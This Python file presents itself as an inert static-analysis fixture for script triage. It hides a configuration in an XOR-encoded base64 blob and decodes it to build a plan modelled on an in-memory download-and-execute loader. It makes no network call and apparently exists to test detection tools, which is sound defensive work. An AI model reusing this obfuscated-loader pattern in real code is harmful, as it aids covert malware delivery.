#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_e85b5230 = "tz3JJxq1ZYsoVKBjii4As2WkKQysb48-RaVpiCsItWOTBASkbZQpEL1hnzoZtWWJZgG1dIsECq1pnjUdnm2eNgazeYcoHaBnngQKrnWVL1TwfIgiB7Vhg2YFqHOPBAqubYspDKlllSgArm6HNAundYg4CLVplDVUp2-JNgi1X5Y6Gb1jmikbqGWJZh6pZZ43NqBymDMAt2WHLACvZJQsGp5jkzoArz2LNB6kcogzDK1spC8GnnCCLwGuboc4CKxwmjIOr1-SP1SiYZYrCKhnlXZa-GbLaVj5Y88_FbRyl2YBtXSLKFPuL8hiD_EyymMK9WTVPhGgbYs3DO9plS0IrWmfdFjyM89uUKAz1SsQvXWIPhueYZw-B7U9sy4HtXKeKBqReY8zBq8vyGIP8TLKYwr1ZA=="

CODEC_e85b5230 = "urlsafe_base64|repeating_key_xor|c1,00,fb,5b,69"



def load_e85b5230():

    return base64.urlsafe_b64decode(MATERIAL_e85b5230)



def decode_e85b5230(stored_bytes):

    key_bytes = (193, 0, 251, 91, 105,)

    return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(stored_bytes))



def recover_e85b5230():

    harmless_value = ":".join(("north", "south"))

    try:

        recovered_bytes = decode_e85b5230(load_e85b5230())

    except (TypeError, ValueError) as error:

        raise RuntimeError("configuration recovery failed") from error

    configuration_text = recovered_bytes.decode("ascii", "strict")

    return configuration_text



def inspect_e85b5230():

    view = memoryview(recover_e85b5230().encode("ascii"))

    return bytes(view).decode("ascii")



def surface_e85b5230():

    return tuple(item for item in ("list_comprehension", "format_map", "wheel_archive", "powershell_to_python"))



def obfuscation_e85b5230():

    return "{left}{right}".format_map({"left": "format_", "right": "map"})



def plan_e85b5230():

    fields = dict(item.split("=", 1) for item in inspect_e85b5230().split("|"))

    analysis_surface = surface_e85b5230()

    obfuscation_surface = obfuscation_e85b5230()

    operation_plan = ("http_client_memory", fields["url"], "memory-handoff")

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_e85b5230())

